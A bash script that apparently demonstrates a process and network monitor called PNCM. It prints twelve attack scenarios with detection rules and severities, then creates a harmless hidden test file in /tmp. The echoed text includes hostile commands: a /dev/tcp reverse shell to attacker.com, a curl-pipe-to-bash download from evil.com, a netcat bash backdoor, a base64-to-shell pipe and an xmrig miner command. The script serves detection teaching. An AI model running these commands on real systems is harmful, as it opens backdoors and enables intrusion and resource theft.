#!/bin/bash
# Process & Network Attack Simulation
# Demonstrates various malicious process and network behaviors

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║        PROCESS & NETWORK ATTACK SIMULATION                      ║"
echo "║        Educational demonstration only                            ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

# Scenario 1: Reverse Shell (C2 Communication)
echo "📍 Scenario 1: Reverse Shell / C2 Communication"
echo "   Attack: bash -i >& /dev/tcp/attacker.com/4444 0>&1"
echo "   Detection: SUSPICIOUS_PROCESS - /dev/tcp pattern"
echo "   Severity: CRITICAL"
echo "   Why: Direct C2 communication channel"
echo ""

# Scenario 2: Cryptocurrency Miner
echo "📍 Scenario 2: Cryptocurrency Mining"
echo "   Attack: ./xmrig --url pool.minexmr.com:443"
echo "   Detection: SUSPICIOUS_PROCESS - crypto miner pattern"
echo "   Severity: CRITICAL"
echo "   Why: Resource theft, possible ransomware precursor"
echo ""

# Scenario 3: Download and Execute
echo "📍 Scenario 3: Download and Execute Payload"
echo "   Attack: curl http://evil.com/payload.sh | bash"
echo "   Detection: SUSPICIOUS_PROCESS - curl | bash pattern"
echo "   Severity: CRITICAL"
echo "   Why: Common malware delivery method"
echo ""

# Scenario 4: Netcat Listener (Backdoor)
echo "📍 Scenario 4: Netcat Listener (Backdoor)"
echo "   Attack: nc -l -p 4444 -e /bin/bash"
echo "   Detection: SUSPICIOUS_PROCESS - nc -l pattern"
echo "   Detection: SUSPICIOUS_LISTENER - port 4444"
echo "   Severity: CRITICAL"
echo "   Why: Backdoor access for attacker"
echo ""

# Scenario 5: Process Running from /tmp
echo "📍 Scenario 5: Malware Running from /tmp"
echo "   Attack: /tmp/.hidden_miner --silent"
echo "   Detection: SUSPICIOUS_PROCESS - /tmp directory"
echo "   Severity: HIGH"
echo "   Why: Malware commonly executes from /tmp"
echo ""

# Scenario 6: Hidden Process
echo "📍 Scenario 6: Hidden Process Name"
echo "   Attack: ./.backdoor (process starts with .)"
echo "   Detection: SUSPICIOUS_PROCESS - hidden process name"
echo "   Severity: HIGH"
echo "   Why: Attempting to hide in process list"
echo ""

# Scenario 7: Connection to Suspicious Port
echo "📍 Scenario 7: Connection to Metasploit Port"
echo "   Attack: Connection to X.X.X.X:4444"
echo "   Detection: SUSPICIOUS_CONNECTION - Metasploit port"
echo "   Severity: CRITICAL"
echo "   Why: Port 4444 = common Metasploit handler"
echo ""

# Scenario 8: IRC Botnet Communication
echo "📍 Scenario 8: IRC Botnet C2"
echo "   Attack: Connection to irc.evil.com:6667"
echo "   Detection: SUSPICIOUS_CONNECTION - IRC port 6667"
echo "   Severity: HIGH"
echo "   Why: IRC often used for botnet C2"
echo ""

# Scenario 9: Base64 Encoded Payload
echo "📍 Scenario 9: Base64 Encoded Malicious Command"
echo "   Attack: echo 'ZXZpbCBjb2Rl' | base64 -d | sh"
echo "   Detection: SUSPICIOUS_PROCESS - base64 decode pipe"
echo "   Severity: HIGH"
echo "   Why: Obfuscation technique to evade detection"
echo ""

# Scenario 10: Python Socket Programming
echo "📍 Scenario 10: Python Reverse Shell"
echo "   Attack: python -c 'import socket;...' (reverse shell)"
echo "   Detection: SUSPICIOUS_PROCESS - python socket pattern"
echo "   Severity: CRITICAL"
echo "   Why: Scripting language for C2 communication"
echo ""

# Scenario 11: High CPU Usage
echo "📍 Scenario 11: Resource Abuse (CPU)"
echo "   Attack: Process consuming >80% CPU"
echo "   Detection: SUSPICIOUS_PROCESS - high CPU usage"
echo "   Severity: MEDIUM (unless crypto miner)"
echo "   Why: DoS or cryptocurrency mining"
echo ""

# Scenario 12: Tor Connection
echo "📍 Scenario 12: Tor Network Usage"
echo "   Attack: Connection to 127.0.0.1:9050 (Tor SOCKS)"
echo "   Detection: SUSPICIOUS_CONNECTION - Tor SOCKS port"
echo "   Severity: MEDIUM"
echo "   Why: Anonymization may indicate data exfiltration"
echo ""

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║                    DETECTION CAPABILITIES                        ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "PNCM detects ALL of these attacks by monitoring:"
echo "  ✓ Process command patterns (regex matching)"
echo "  ✓ Process execution locations (/tmp, /dev/shm)"
echo "  ✓ Process names (hidden files starting with .)"
echo "  ✓ Network connections (suspicious ports & IPs)"
echo "  ✓ Listening ports (backdoor listeners)"
echo "  ✓ Resource usage (CPU/memory abuse)"
echo "  ✓ Connection destinations (C2 infrastructure)"
echo ""
echo "Detection Time: Real-time or periodic (configurable)"
echo "False Positive Rate: Low (patterns based on real attacks)"
echo ""
echo "Run 'python3 pncm.py --monitor' to see detection in action!"
echo ""

# Create some test "suspicious" commands that can be detected
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║              SAFE DEMONSTRATION (No Actual Attack)              ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "Creating harmless test files to demonstrate detection..."
echo ""

# Create test files that look suspicious
mkdir -p /tmp/test_pncm
echo "#!/bin/bash" > /tmp/test_pncm/.hidden_script
echo "echo 'This is a test'" >> /tmp/test_pncm/.hidden_script
chmod +x /tmp/test_pncm/.hidden_script

echo "Test files created in /tmp/test_pncm/"
echo "These files LOOK suspicious (hidden, in /tmp) but do nothing malicious"
echo ""
echo "Run: python3 pncm.py --monitor"
echo "To see how PNCM would flag processes running from /tmp/"
echo ""
echo "Clean up: rm -rf /tmp/test_pncm"
